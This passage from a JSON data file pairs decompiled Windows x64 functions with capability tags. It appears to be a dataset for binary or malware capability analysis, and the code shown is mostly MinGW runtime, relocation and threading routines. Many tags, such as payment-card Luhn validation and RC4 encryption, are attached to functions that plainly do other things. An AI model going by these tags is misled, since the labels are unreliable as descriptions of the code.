&& (*(arg1 + 0x130) == 0)) {\n        fcn.00404790(arg1, arg2_00, *arg3);\n        iVar5 = *(arg1 + 0x100);\n    }\n    if (iVar5 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n        iVar6 = 1;\n        iVar5 = 0;\n    }\n    else {\n        iVar6 = iVar5 + 1;\n    }\n    *(arg1 + 0x100) = iVar6;\n    *(arg1 + iVar5) = 0x29;\n    *(arg1 + 0x108) = 0x29;\n    fcn.00408790(arg1, arg2_00, arg4, 1);\n    *(arg1 + 0x128) = uVar3;\n    return;\n}\n",
        "token_count": 1435
    },
    "0040a210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a210(uchar *arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar *puVar6;\n    char *pcVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    code *pcVar11;\n    int32_t *piVar12;\n    uint32_t *puVar13;\n    int64_t iVar14;\n    int32_t *piVar15;\n    int32_t iVar16;\n    ulong uVar17;\n    uint64_t *arg3_00;\n    uchar *in_R9;\n    int64_t unaff_R12;\n    uchar *unaff_R13;\n    uchar *unaff_R14;\n    ulong auStack312 [5];\n    uchar auStack272 [12];\n    uchar auStack260 [4];\n    uchar *puStack256;\n    ulong uStack232;\n    code *pcStack208;\n    uchar *puStack200;\n    ulong uStack192;\n    int64_t iStack184;\n    uchar *puStack176;\n    uchar *puStack168;\n    ulong uStack160;\n    uint uStack108;\n    ulong uStack104;\n    ulong uStack80;\n    int32_t iStack68;\n    \n    uVar17 = arg3;\n    if (*0x434354 < 1) goto code_r0x0040a3f5;\n    pcStack208 = NULL;\n    iVar4 = *0x434358;\n    do {\n        in_R9 = *(iVar4 + 8);\n        if ((in_R9 <= arg1) &&\n           (in_R9 = in_R9 + *(*(iVar4 + 0x10) + 8),  pcVar11 = _sym.imp.KERNEL32.dll_VirtualQuery,  arg1 < in_R9))\n        goto code_r0x0040a2eb;\n        uVar9 = pcStack208 + 1;\n        pcStack208 = uVar9;\n        iVar4 = iVar4 + 0x18;\n    } while (uVar9 != *0x434354);\n    while( true ) {\n        uStack160 = 0x40a26f;\n        unaff_R12 = fcn.0040ad70(arg1);\n        if (unaff_R12 == 0) break;\n        unaff_R13 = &stack0xffffffffffffff98;\n        unaff_R14 = pcStack208 * 0x18;\n        puVar10 = unaff_R14 + *0x434358;\n        *(puVar10 + 4) = unaff_R12;\n        *puVar10 = 0;\n        uStack160 = 0x40a2a4;\n        iVar4 = fcn.0040aeb0();\n        *(puVar10 + 2) = iVar4 + *(unaff_R12 + 0xc);\n        pcStack208 = _sym.imp.KERNEL32.dll_VirtualQuery;\n        uStack160 = 0x40a2ce;\n        iVar4 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(*(unaff_R14 + *0x434358 + 8), unaff_R13, 0x30);\n        if (iVar4 == 0) {\n            uVar17 = *(unaff_R14 + *0x434358 + 8);\n            uStack160 = 0x40a419;\n            fcn.0040a1a0(\"  VirtualQuery failed for %d bytes at address %p\", *(unaff_R12 + 8), uVar17, in_R9);\n            break;\n        }\n        if ((iStack68 == 4) || (iStack68 == 0x40)) {\ncode_r0x0040a2e4:\n            *0x434354 = *0x434354 + 1;\n            pcVar11 = pcStack208;\ncode_r0x0040a2eb:\n            unaff_R13 = &stack0xffffffffffffff98;\n            uStack160 = 0x40a2f9;\n            iVar4 = (*pcVar11)(arg1, unaff_R13, 0x30);\n            pcVar3 = _sym.imp.KERNEL32.dll_VirtualProtect;\n            pcStack208 = pcVar11;\n            if (iVar4 != 0) {\n                if ((iStack68 != 4) && (iStack68 != 0x40)) {\n                    uStack160 = 0x40a366;\n                    (*_sym.imp.KERNEL32.dll_VirtualProtect)(uStack104, uStack80, 0x40, &stack0xffffffffffffff94);\n                    uStack160 = 0x40a374;\n                    sub.msvcrt.dll_memcpy(arg1, arg2, arg3);\n                    if ((iStack68 != 0x40) && (iStack68 != 4)) {\n                        uStack160 = 0x40a396;\n                        (*pcVar3)(uStack104, uStack80, uStack108, &stack0xffffffffffffff94);\n                    }\n                    return;\n                }\n    // WARNING: Could not recover jumptable at 0x0040b8a0. Too many branches\n    // WARNING: Treating indirect jump as call\n                (*_sym.imp.msvcrt.dll_memcpy)(arg1, arg2, arg3);\n                return;\n            }\n            goto code_r0x0040a428;\n        }\n        unaff_R14 = unaff_R14 + *0x434358;\n        uVar17 = 0x40;\n        uStack160 = 0x40a3d9;\n        in_R9 = unaff_R14;\n        iVar16 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(uStack104);\n        if (iVar16 != 0) goto code_r0x0040a2e4;\n        uStack160 = 0x40a3e7;\n        uVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uStack160 = 0x40a3f5;\n        fcn.0040a1a0(\"  VirtualProtect failed with code 0x%x\", uVar9, uVar17, in_R9);\ncode_r0x0040a3f5:\n        pcStack208 = NULL;\n    }\n    uStack160 = 0x40a428;\n    fcn.0040a1a0(\"Address %p has no image-section\", arg1, uVar17, in_R9);\ncode_r0x0040a428:\n    pcVar7 = \"  VirtualQuery failed for %d bytes at address %p\";\n    uStack160 = 0x40a43c;\n    puVar6 = arg1;\n    fcn.0040a1a0(\"  VirtualQuery failed for %d bytes at address %p\", 0x30, arg1, in_R9);\n    if (*0x434350 != 0) {\n        return;\n    }\n    *0x434350 = 1;\n    auStack312[0] = 0x40a47f;\n    puStack200 = arg1;\n    uStack192 = arg2;\n    iStack184 = unaff_R12;\n    puStack176 = unaff_R13;\n    puStack168 = unaff_R14;\n    uStack160 = arg3;\n    fcn.0040adc0();\n    auStack312[0] = 0x40a496;\n    iVar4 = fcn.0040b810(pcVar7);\n    piVar12 = 0x4300a0;\n    *0x434354 = 0;\n    iVar4 = -iVar4;\n    *0x434358 = &stack0xfffffffffffffef0 + iVar4;\n    if ((*0x4300a0 == 0) && (*0x4300a4 == 0)) {\n        in_R9 = *0x4300a8;\n        if (*0x4300a8 == 0) {\n            piVar12 = 0x4300ac;\n            puVar6 = *0x4300ac;\n            if ((*0x4300ac != 0) || (*0x4300b0 != 0)) goto code_r0x0040a630;\n        }\n        uVar8 = piVar12[2];\n        if (piVar12[2] != 1) {\ncode_r0x0040a74d:\n            *(&stack0xfffffffffffffec8 + iVar4) = 0x40a759;\n            fcn.0040a1a0(\"  Unknown pseudo relocation protocol version %d.\\n\", uVar8, puVar6, in_R9);\n            return;\n        }\n        puVar13 = piVar12 + 3;\n        if (0x4300b7 < puVar13) {\n            *0x434354 = 0;\n            return;\n        }\n        do {\n            uVar1 = *(puVar13 + 2);\n            arg3_00 = *puVar13 + 0x400000;\n            pcVar7 = puVar13[1] + 0x400000;\n            uVar8 = *arg3_00;\n            if (uVar1 == 0x10) {\n                in_R9 = *pcVar7;\n                puVar6 = in_R9;\n                if (*pcVar7 < 0) {\n                    puVar6 = in_R9 | 0xffffffffffff0000;\n                }\n                puStack256 = puVar6 + (uVar8 - arg3_00);\n                *(&stack0xfffffffffffffec8 + iVar4) = 0x40a6e1;\n                fcn.0040a210(pcVar7, &stack0xffffffffffffff00, 2);\n            }\n            else {\n                uVar9 = uVar1;\n                if (uVar1 < 0x11) {\n                    if (uVar9 != 8) {\ncode_r0x0040a6e6:\n                        pcVar7 = \"  Unknown pseudo relocation bit size %d.\\n\";\n                        uVar8 = uVar9;\n                        puStack256 = NULL;\n                        *(&stack0xfffffffffffffec8 + iVar4) = 0x40a6fc;\n                        fcn.0040a1a0(\"  Unknown pseudo relocation bit size %d.\\n\", uVar8, arg3_00, in_R9);\n                        goto code_r0x0040a6fc;\n                    }\n                    in_R9 = *pcVar7;\n                    puVar6 = in_R9;\n                    if (*pcVar7 < '\\0') {\n                        puVar6 = in_R9 | 0xffffffffffffff00;\n                    }\n                    puStack256 = puVar6 + (uVar8 - arg3_00);\n                    *(&stack0xfffffffffffffec8 + iVar4) = 0x40a6a7;\n                    fcn.0040a210(pcVar7, &stack0xffffffffffffff00, 1);\n                }\n                else if (uVar9 == 0x20) {\ncode_r0x0040a6fc:\n                    in_R9 = *pcVar7;\n                    puVar6 = in_R9;\n                    if (*pcVar7 < 0) {\n                        puVar6 = in_R9 | 0xffffffff00000000;\n                    }\n                    puStack256 = puVar6 + (uVar8 - arg3_00);\n                    *(&stack0xfffffffffffffec8 + iVar4) = 0x40a72a;\n                    fcn.0040a210(pcVar7, &stack0xffffffffffffff00, 4);\n                }\n                else {\n                    if (uVar9 != 0x40) goto code_r0x0040a6e6;\n                    puStack256 = (uVar8 - arg3_00) + *pcVar7;\n                    *(&stack0xfffffffffffffec8 + iVar4) = 0x40a596;\n                    fcn.0040a210(pcVar7, &stack0xffffffffffffff00, 8);\n                }\n            }\n            puVar13 = puVar13 + 3;\n        } while (puVar13 < 0x4300b8);\n    }\n    else {\ncode_r0x0040a630:\n        if (0x4300b7 < piVar12) {\n            *0x434354 = 0;\n            return;\n        }\n        do {\n            uVar9 = piVar12[1];\n            piVar15 = piVar12 + 2;\n            puStack256 = puStack256 & 0xffffffff00000000 | *(uVar9 + 0x400000) + *piVar12;\n            *(&stack0xfffffffffffffec8 + iVar4) = 0x40a664;\n            fcn.0040a210(uVar9 + 0x400000, &stack0xffffffffffffff00, 4);\n            piVar12 = piVar15;\n        } while (piVar15 < 0x4300b8);\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_VirtualQuery;\n    pcVar11 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar14 = 0;\n    iVar16 = 0;\n    if (0 < *0x434354) {\n        do {\n            if (*(*0x434358 + iVar14) != 0) {\n                uVar17 = *(*0x434358 + iVar14 + 8);\n                *(&stack0xfffffffffffffec8 + iVar4) = 0x40a603;\n                iVar5 = (*pcVar3)(uVar17, &stack0xffffffffffffff00, 0x30);\n                uVar17 = uStack232;\n                puVar6 = puStack256;\n                if (iVar5 == 0) {\n                    puVar6 = *(*0x434358 + iVar14 + 8);\n                    uVar8 = *(*(*0x434358 + iVar14 + 0x10) + 8);\n                    *(&stack0xfffffffffffffec8 + iVar4) = 0x40a74d;\n                    fcn.0040a1a0(\"  VirtualQuery failed for %d bytes at address %p\", uVar8, puVar6, in_R9);\n                    goto code_r0x0040a74d;\n                }\n                uVar2 = *(*0x434358 + iVar14);\n                *(&stack0xfffffffffffffec8 + iVar4) = 0x40a625;\n                in_R9 = &stack0xfffffffffffffefc;\n                (*pcVar11)(puVar6, uVar17, uVar2);\n            }\n            iVar16 = iVar16 + 1;\n            iVar14 = iVar14 + 0x18;\n        } while (iVar16 < *0x434354);\n    }\n    return;\n}\n",
        "token_count": 3231
    },
    "0040aa00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040aa00(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x434920);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x434900; puVar1 != NULL; puVar1 = *(puVar1 + 4)) {\n        iVar5 = (*pcVar3)(*puVar1);\n        iVar4 = (*pcVar2)();\n        if ((iVar4 == 0) && (iVar5 != 0)) {\n            (**(puVar1 + 2))();\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x0040aa6a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x434920);\n    return;\n}\n",
        "token_count": 240
    },
    "0040ac30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040ac30(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = arg1 + *(arg1 + 0x3c);\n    if (*piVar1 != 0x4550) {\n        return false;\n    }\n    return *(piVar1 + 6) == 0x20b;\n}\n",
        "token_count": 82
    },
    "0040ac70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.0040ac70(int64_t arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    arg1 = arg1 + *(arg1 + 0x3c);\n    iVar2 = arg1 + 0x18 + *(arg1 + 0x14);\n    if (*(arg1 + 6) != 0) {\n        iVar1 = iVar2 + 0x28;\n        do {\n            if ((*(iVar2 + 0xc) <= arg2) && (arg2 < *(iVar2 + 0xc) + *(iVar2 + 8))) {\n                return iVar2;\n            }\n            iVar2 = iVar2 + 0x28;\n        } while (iVar2 != iVar1 + (*(arg1 + 6) - 1) * 0x28);\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "0040b0f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0040b0f0(int64_t arg1)\n\n{\n    return **(*(arg1 + 0x20) + 0x10) + *(*(arg1 + 0x20) + 8);\n}\n",
        "token_count": 54
    },
    "0040b650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "contain loop",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.0040b650(ulong arg1, ulong arg2, code *arg3)\n\n{\n    uchar *arg2_00;\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    ulong auStack128 [5];\n    ulong uStack88;\n    ulong var_48h;\n    ulong uStack72;\n    \n    auStack128[0] = 0x40b676;\n    uVar7 = arg1;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack128[0] = 0x40b68e;\n    iVar6 = fcn.0040b810(uVar7);\n    iVar6 = -iVar6;\n    arg2_00 = &stack0xffffffffffffffa8 + iVar6;\n    *(&stack0xffffffffffffffa8 + iVar6) = 0x656d68732d636367;\n    *(&fcn.0040b650::var_48h + iVar6) = 0x64742d6d;\n    *(&fcn.0040b650::var_48h + iVar6 + 4) = 0x326d;\n    *(&fcn.0040b650::var_48h + iVar6 + 6) = 0x2d;\n    *(&stack0xffffffffffffff80 + iVar6) = 0x40b6d6;\n    sub.msvcrt.dll_memcpy(&fcn.0040b650::var_48h + iVar6 + 7, arg1, iVar4);\n    puVar1 = &stack0xffffffffffffffb8 + iVar4 + iVar6;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    (&stack0xffffffffffffffa8)[(iVar4 + 0x50) + iVar6] = 0;\n    (&stack0xffffffffffffffa8)[(iVar4 + 0xf) + iVar6] = 0;\n    *(&stack0xffffffffffffff80 + iVar6) = 0x40b71e;\n    uVar7 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    (&stack0xffffffffffffffa8)[(iVar4 + 0xf) + iVar6] = 0x2d;\n    *(&stack0xffffffffffffff80 + iVar6) = 0x40b734;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar7, 0xffffffff);\n    if (iVar5 != 0) {\n        pcVar2 = swi(3);\n        uVar8 = (*pcVar2)();\n        return uVar8;\n    }\n    *(&stack0xffffffffffffff80 + iVar6) = 0x40b742;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(&stack0xffffffffffffff80 + iVar6) = 0x40b753;\n        uVar9 = sub.msvcrt.dll_malloc(arg2);\n        uVar8 = 0x40;\n        do {\n            if ((uVar9 >> (uVar8 & 0x3f) & 1) != 0) {\n                arg2_00[(iVar4 + 0x50) - uVar8] = 0x41;\n            }\n            uVar10 = uVar8 - 1;\n            uVar8 = uVar10;\n        } while (uVar10 != 0);\n        var_48h._4_4_ = iVar4 + 0x10;\n        *(&stack0xffffffffffffff80 + iVar6) = 0x40b787;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        uVar8 = var_48h._4_4_;\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar8 = (*pcVar2)();\n            return uVar8;\n        }\n        *(&stack0xffffffffffffff80 + iVar6) = 0x40b79f;\n        uVar8 = fcn.0040b5d0(uVar3, arg2_00, iVar4 + 0x51, uVar8);\n        if (uVar8 == uVar9) {\n            *(&stack0xffffffffffffff80 + iVar6) = 0x40b7fd;\n            sub.msvcrt.dll_memset(uVar9, 0, arg2);\n            if (arg3 != NULL) {\n                *(&stack0xffffffffffffff80 + iVar6) = 0x40b808;\n                (*arg3)(uVar9);\n            }\n        }\n        else {\n            *(&stack0xffffffffffffff80 + iVar6) = 0x40b7af;\n            sub.msvcrt.dll_free(uVar9);\n        }\n    }\n    else {\n        *(&stack0xffffffffffffff80 + iVar6) = 0x40b7eb;\n        uVar8 = fcn.0040b5d0(uVar3, arg2_00, iVar4 + 0x51, iVar4 + 0x10);\n    }\n    *(&stack0xffffffffffffff80 + iVar6) = 0x40b7b8;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar7);\n    *(&stack0xffffffffffffff80 + iVar6) = 0x40b7c1;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n    return uVar8;\n}\n",
        "token_count": 1391
    },
    "0040bc10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.0040bc10(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t arg1_00;\n    int64_t *piVar3;\n    \n    if (*0x434988 == 0) {\n        *0x434988 = fcn.00410a00(\"once_global_shmem\", 0x10, 0x40b9c0);\n    }\n    fcn.00410db0(*0x434988);\n    if (*0x434990 == NULL) {\n        *0x434990 = fcn.00410a00(\"once_obj_shmem\", 8, 0);\n    }\n    arg1_00 = *0x434988;\n    piVar1 = **0x434990;\n    if (piVar1 == NULL) {\n        piVar3 = sub.msvcrt.dll_calloc(1);\n        *piVar3 = arg1;\n        *(piVar3 + 2) = 1;\n        if (*0x434990 == NULL) {\n            *0x434990 = fcn.00410a00(\"once_obj_shmem\", 8, 0);\n        }\n        **0x434990 = piVar3;\ncode_r0x0040bc83:\n        fcn.004101e0(piVar3 + 1, 0);\n        arg1_00 = *0x434988;\n    }\n    else {\n        iVar2 = *piVar1;\n        while (iVar2 != arg1) {\n            piVar3 = piVar1[3];\n            if (piVar3 == NULL) {\n                piVar3 = sub.msvcrt.dll_calloc(1);\n                *piVar3 = arg1;\n                *(piVar3 + 2) = 1;\n                piVar1[3] = piVar3;\n                goto code_r0x0040bc83;\n            }\n            piVar1 = piVar3;\n            iVar2 = *piVar3;\n        }\n        *(piVar1 + 2) = *(piVar1 + 2) + 1;\n        piVar3 = piVar1;\n    }\n    if (arg1_00 != 0) {\n        fcn.00410d10(arg1_00);\n        return piVar3;\n    }\n    *0x434988 = fcn.00410a00(\"once_global_shmem\", 0x10, 0x40b9c0);\n    fcn.00410d10(*0x434988);\n    return piVar3;\n}\n",
        "token_count": 562
    },
    "0040bd90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0040bd90(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    code *pcVar6;\n    ulong in_RAX;\n    int64_t iVar7;\n    int64_t iVar8;\n    \n    if (arg1 == 0) {\n        return in_RAX;\n    }\n    if (*0x434988 == NULL) {\n        *0x434988 = fcn.00410a00(\"once_global_shmem\", 0x10, 0x40b9c0);\n    }\n    fcn.00410db0(*0x434988);\n    if (*0x434990 == NULL) {\n        *0x434990 = fcn.00410a00(\"once_obj_shmem\", 8, 0);\n    }\n    iVar7 = **0x434990;\n    if ((arg1 == iVar7) || (iVar7 == 0)) {\n        iVar8 = 0;\n    }\n    else {\n        do {\n            iVar8 = iVar7;\n            iVar7 = *(iVar8 + 0x18);\n            if (arg1 == iVar7) break;\n        } while (iVar7 != 0);\n    }\n    if (iVar7 == 0) {\n        iVar7 = (*_sym.imp.msvcrt.dll___iob_func)();\n        sub.msvcrt.dll_fprintf(iVar7 + 0x60, \"%p not found?!?!\\n\", arg1);\n    }\n    else {\n        piVar1 = arg1 + 0x10;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00410810(arg1 + 8);\n            if (iVar8 == 0) {\n                if (*0x434990 == NULL) {\n                    *0x434990 = fcn.00410a00(\"once_obj_shmem\", 8, 0);\n                }\n                **0x434990 = *(arg1 + 0x18);\n            }\n            else {\n                *(iVar8 + 0x18) = *(arg1 + 0x18);\n            }\n            sub.msvcrt.dll_free(arg1);\n        }\n    }\n    if (*0x434988 == NULL) {\n        *0x434988 = fcn.00410a00(\"once_global_shmem\", 0x10, 0x40b9c0);\n    }\n    puVar5 = *0x434988;\n    if (*0x434988 == NULL) {\n        return 0x16;\n    }\n    puVar2 = *0x434988 + 3;\n    LOCK();\n    puVar3 = *0x434988 + 3;\n    *puVar3 = *puVar3 - 1;\n    pcVar6 = _sym.imp.KERNEL32.dll_Sleep;\n    uVar4 = *puVar3;\n    while (uVar4 != 0) {\n        LOCK();\n        *puVar2 = *puVar2 + 1;\n        (*pcVar6)(0);\n        LOCK();\n        *puVar2 = *puVar2 - 1;\n        uVar4 = *puVar2;\n    }\n    if (puVar5[1] < *puVar5) {\n        puVar5[1] = puVar5[1] + 1;\n        if (puVar5[1] != *puVar5) goto code_r0x00410d6c;\n    }\n    else if (puVar5[1] != *puVar5) goto code_r0x00410d6c;\n    *puVar5 = 0;\n    puVar5[1] = 0;\ncode_r0x00410d6c:\n    LOCK();\n    puVar5[3] = puVar5[3] + 1;\n    return 0;\n}\n",
        "token_count": 869
    },
    "00410d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution",
            "delay execution"
        ],
        "decompiled_code": "\nulong fcn.00410d10(uint32_t *arg1)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    \n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    puVar1 = arg1 + 3;\n    LOCK();\n    puVar2 = arg1 + 3;\n    *puVar2 = *puVar2 - 1;\n    pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n    uVar3 = *puVar2;\n    while (uVar3 != 0) {\n        LOCK();\n        *puVar1 = *puVar1 + 1;\n        (*pcVar4)(0);\n        LOCK();\n        *puVar1 = *puVar1 - 1;\n        uVar3 = *puVar1;\n    }\n    if (arg1[1] < *arg1) {\n        arg1[1] = arg1[1] + 1;\n        if (arg1[1] != *arg1) goto code_r0x00410d6c;\n    }\n    else if (arg1[1] != *arg1) goto code_r0x00410d6c;\n    *arg1 = 0;\n    arg1[1] = 0;\ncode_r0x00410d6c:\n    LOCK();\n    arg1[3] = arg1[3] + 1;\n    return 0;\n}\n",
        "token_count": 332
    },
    "0040c540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0040c540(void)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t arg1;\n    \n    if (*0x4349b8 == 0) {\n        *0x4349b8 = fcn.00410a00(\"mtx_pthr_locked_shmem\", 8, 0x40b9b0);\n    }\n    fcn.00410710(*0x4349b8);\n    if (*0x4349c8 == NULL) {\n        *0x4349c8 = fcn.00410a00(\"pthr_root_shmem\", 8, 0);\n    }\n    arg1 = **0x4349c8;\n    if (arg1 == 0) {\n        iVar1 = sub.msvcrt.dll_calloc(1, 0x1e0);\n        arg1 = iVar1;\n        if (iVar1 != 0) {\n            iVar2 = fcn.0040bf40(iVar1);\n            *(iVar1 + 0x1d8) = iVar2;\n            if (iVar2 == 0) {\n                arg1 = 0;\n                sub.msvcrt.dll_free(iVar1);\n            }\n        }\n    }\n    else {\n        iVar1 = fcn.0040bf40(arg1);\n        *(arg1 + 0x1d8) = iVar1;\n        if (iVar1 == 0) {\n            arg1 = 0;\n        }\n        else {\n            if (*0x4349c8 == NULL) {\n                *0x4349c8 = fcn.00410a00(\"pthr_root_shmem\", 8, 0);\n            }\n            iVar1 = *(arg1 + 0x1d0);\n            **0x4349c8 = iVar1;\n            if (iVar1 == 0) {\n                if (*0x4349c0 == NULL) {\n                    *0x4349c0 = fcn.00410a00(\"pthr_last_shmem\", 8, 0);\n                }\n                **0x4349c0 = 0;\n            }\n            *(arg1 + 0x1d0) = 0;\n        }\n    }\n    if (*0x4349b8 == 0) {\n        *0x4349b8 = fcn.00410a00(\"mtx_pthr_locked_shmem\", 8, 0x40b9b0);\n    }\n    fcn.00410100(*0x4349b8);\n    return arg1;\n}\n",
        "token_count": 559
    },
    "0040fec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0040fec0(int32_t *arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    char *arg1_00;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    ulong auStack184 [5];\n    ulong uStack144;\n    ulong uStack136;\n    uint64_t uStack128;\n    \n    uStack128 = arg2;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    iVar6 = *0x434a38;\n    if ((*arg1 == -0x454e0ff3) && (0 < arg1[1])) {\n        bVar13 = *0x434a38 == 0;\n        arg1[1] = arg1[1] + -1;\n        if (bVar13) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n            fcn.00410d10(*0x434a38);\n            return uStack128;\n        }\n        fcn.00410d10(iVar6);\n        return uStack128;\n    }\n    iVar6 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf(iVar6 + 0x60, 0x42f208, \"(m_->valid == LIFE_MUTEX) && (m_->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_00 = \"mutex_global_shmem\";\n    auStack184[0] = 0x410a26;\n    uStack136 = arg1;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack184[0] = 0x410a3e;\n    iVar7 = fcn.0040b810(arg1_00);\n    iVar7 = -iVar7;\n    iVar6 